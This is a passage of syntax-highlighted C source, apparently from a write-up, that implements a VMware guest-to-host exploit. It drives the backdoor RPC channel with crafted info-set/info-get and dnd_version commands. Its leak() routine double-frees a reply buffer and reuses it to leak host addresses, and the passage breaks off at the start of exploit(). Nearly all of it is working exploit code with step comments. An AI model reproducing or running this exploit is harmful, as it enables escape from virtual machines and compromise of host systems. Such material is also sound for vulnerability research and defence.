string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b 